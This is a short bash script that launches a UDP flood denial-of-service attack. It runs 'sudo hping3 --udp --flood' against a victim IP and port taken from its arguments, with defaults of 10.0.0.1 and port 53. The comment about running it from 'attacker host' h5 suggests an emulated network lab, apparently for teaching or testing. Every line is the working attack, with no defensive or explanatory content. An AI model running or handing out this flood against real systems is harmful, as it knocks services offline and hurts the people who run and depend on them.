#!/bin/bash
# UDP flood attack - run from attacker host xterm (e.g. h5)
# Usage: ./udp_flood.sh <victim_ip> <port>
VICTIM=${1:-10.0.0.1}
PORT=${2:-53}
echo "Launching UDP flood against $VICTIM:$PORT ..."
sudo hping3 --udp --flood -p $PORT $VICTIM
